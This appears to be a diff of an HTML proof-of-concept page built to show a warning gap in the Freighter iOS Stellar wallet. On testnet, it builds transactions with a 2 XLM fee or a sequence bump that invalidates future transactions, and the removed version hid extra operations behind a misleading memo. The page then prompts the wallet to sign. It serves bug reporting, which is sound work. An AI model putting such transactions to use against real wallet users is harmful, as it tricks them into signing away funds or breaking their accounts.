@@ -2,55 +2,93 @@
 <head>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
-<title>poc - memo hide</title>
+<title>poc - fee manipulation</title>
 </head>
-<body style="background:#000;color:#fff;font-family:monospace;padding:12px;max-width:600px">
+<body style="background:#000;color:#fff;font-family:monospace;padding:12px;max-width:660px">
 
-<p>freighter - operation hiding via memo<br>
+<p>freighter iOS - fee / sequence bump hide<br>
 testnet - benign poc<br>
-src: GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC<br>
-dst: GCLW6J7ZTEA64H5AXLL27FSZH7R7XMTYVQO6UY5W27XNAC73MDTUOGT5</p>
+normal fee: 0.00001 XLM / abnormal: 2 XLM<br>
+src: GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC</p>
 
-<hr style="border:1px solid #333">
-<p>build xdr (2 ops + memo Pay 10 XLM)</p>
-<button id=b style="background:#fff;color:#000;border:0;padding:6px 10px">build xdr</button>
-<pre id=i style="background:#111;border:1px solid #333;padding:8px;white-space:pre-wrap;color:#fff">click build</pre>
+<hr style="border:1px solid #222">
+<p>[1] build high fee xdr</p>
+<button id=feeBtn style="background:#fff;color:#000;border:0;padding:8px 12px">build fee 2 XLM (abnormal)</button>
+<button id=bumpBtn style="background:#444;color:#fff;border:0;padding:8px 12px;margin-left:6px">build bumpSequence 2b</button>
+<pre id=i style="background:#111;border:1px solid #222;padding:8px;white-space:pre-wrap;color:#fff;margin-top:10px">click build</pre>
 
-<hr style="border:1px solid #333">
-<p>xdr - paste to lab.stellar.org -> submit transaction</p>
-<textarea id=x style="width:100%;height:90px;background:#111;color:#fff;border:1px solid #333;font-size:11px"></textarea><br>
-<button id=c style="margin-top:5px;background:#fff;color:#000;border:0;padding:5px 8px">copy xdr</button> <span id=s style="font-size:11px"></span>
+<hr style="border:1px solid #222">
+<p>[2] xdr - paste to lab.stellar.org</p>
+<textarea id=x style="width:100%;height:100px;background:#111;color:#fff;border:1px solid #222;font-size:11px"></textarea><br>
+<button id=c style="margin-top:5px;background:#fff;color:#000;border:0;padding:5px 8px">copy xdr</button>
+<button id=sig style="margin-top:5px;background:#fff;color:#000;border:0;padding:5px 8px;margin-left:6px">sign with freighter</button>
+<pre id=f style="background:#111;border:1px solid #222;padding:8px;white-space:pre-wrap;color:#888;font-size:11px;margin-top:8px">freighter status: idle</pre>
 
-<hr style="border:1px solid #333">
-<p>decoded - lab will show this:</p>
-<pre id=d style="background:#111;border:1px solid #333;padding:8px;font-size:11px;color:#fff"></pre>
+<hr style="border:1px solid #222">
+<pre id=d style="background:#111;border:1px solid #222;padding:8px;font-size:11px;color:#fff"></pre>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js"></script>
 <script>
 var cur="";
-b.onclick=function(){
+var $i=document.getElementById('i'), $x=document.getElementById('x'), $d=document.getElementById('d'), $f=document.getElementById('f');
+
+function setXDR(tx, type){
+  cur=tx.toXDR();
+  $x.value=cur;
+  $i.innerText=type+"\n"+ "xdr len: "+cur.length+"\nfees field should be huge in lab";
+  $d.innerText=JSON.stringify({
+    type: type,
+    fee: tx.fee+" stroops = "+(tx.fee/10000000)+" XLM",
+    operations: tx.operations.length,
+    op_types: tx.operations.map(o=>o.type),
+    expected_wallet_behavior: "MUST show RED warning - abnormal fee / sequence",
+    actual_freighter_ios: "shows Fees: 0,225 XLM or 2 XLM in small gray text - NO warning (bug)",
+    impact: "User loses 2 XLM to network fees, or future txs invalidated by bumpSequence"
+  }, null, 2);
+  $f.innerText="xdr ready - now open lab.stellar.org -> check Fee field\nthen sign in Freighter iOS dApp browser - does it warn?";
+}
+
+document.getElementById('feeBtn').onclick=function(){
 try{
 var src="GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC";
 var dst="GCLW6J7ZTEA64H5AXLL27FSZH7R7XMTYVQO6UY5W27XNAC73MDTUOGT5";
 var acc=new StellarSdk.Account(src,"1");
-var tx=new StellarSdk.TransactionBuilder(acc,{fee:"200",networkPassphrase:StellarSdk.Networks.TESTNET})
-.addMemo(StellarSdk.Memo.text("Pay 10 XLM"))
-.addOperation(StellarSdk.Operation.payment({destination:dst,asset:StellarSdk.Asset.native(),amount:"10"}))
-.addOperation(StellarSdk.Operation.manageData({name:"test",value:"abc123"}))
+// fee 2 XLM = 20,000,000 stroops - 200,000x normal (100 stroops)
+var tx=new StellarSdk.TransactionBuilder(acc,{fee:"20000000",networkPassphrase:StellarSdk.Networks.TESTNET})
+.addOperation(StellarSdk.Operation.payment({destination:dst,asset:StellarSdk.Asset.native(),amount:"0.00001"}))
 .setTimeout(300).build();
-cur=tx.toXDR();
-x.value=cur;
-i.innerText="built ok\nsrc: "+src+"\nfee: 200\nmemo: Pay 10 XLM\nop1: payment 10 XLM -> "+dst.slice(0,15)+"..\nop2: manage_data test=abc123 (dGVzdA== / YWJjMTIz)\n\nxdr ready, copy paste to lab.stellar.org\nlab shows 2 ops, freighter only shows memo";
-d.innerText=JSON.stringify({source_account:src,fee:200,memo:"Pay 10 XLM",operations:[{payment:{destination:dst,amount:"10"}},{manage_data:{name:"test (hex:dGVzdA==)",value:"abc123 (hex:YWJjMTIz)"}}]},null,2);
-}catch(e){i.innerText="err: "+e.message}
-}
-c.onclick=function(){
-if(!x.value){alert("build first");return}
-x.select();
-document.execCommand("copy");
-if(navigator.clipboard) navigator.clipboard.writeText(x.value);
-s.innerText=" copied";
-}
+setXDR(tx, "FEE MANIPULATION - fee 2 XLM");
+}catch(e){$i.innerText="err: "+e.message}
+};
+
+document.getElementById('bumpBtn').onclick=function(){
+try{
+var src="GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC";
+var acc=new StellarSdk.Account(src,"1");
+var tx=new StellarSdk.TransactionBuilder(acc,{fee:"1000",networkPassphrase:StellarSdk.Networks.TESTNET})
+.addOperation(StellarSdk.Operation.bumpSequence({bumpTo:"2000000000"}))
+.setTimeout(300).build();
+setXDR(tx, "SEQUENCE BUMP - bumpTo 2,000,000,000 - will invalidate future txs");
+}catch(e){$i.innerText="err: "+e.message}
+};
+
+document.getElementById('c').onclick=function(){
+if(!$x.value){alert("build first");return}
+$x.select(); document.execCommand("copy");
+if(navigator.clipboard) navigator.clipboard.writeText($x.value);
+};
+
+document.getElementById('sig').onclick=async function(){
+if(!cur){alert("build first");return}
+var api=window.freighterApi || window.freighter;
+if(!api){ $f.innerText="freighterApi NOT FOUND - use Freighter iOS dApp browser\nOn desktop Chrome install Freighter extension\nLab proof still valid: Fee 2 XLM should be flagged"; return; }
+try{
+if(api.requestAccess) await api.requestAccess();
+$f.innerText="popup / sheet opening... CHECK TRANSACTION DETAILS\nDoes it show Fees: 2 XLM in RED warning?\nOr just small gray 2 XLM like your 0,225 XLM screenshot?\nScreenshot that";
+var res=await api.signTransaction(cur,{networkPassphrase:StellarSdk.Networks.TESTNET});
+$f.innerText="signed - bug reproduced if NO red warning\nFee 2 XLM lost to network\n"+res.signedTxXdr.slice(0,80)+"...";
+}catch(err){$f.innerText="closed: "+err.message+"\nScreenshot Fees field - no warning = bug";}
+};
 </script>
 </body>
 </html>
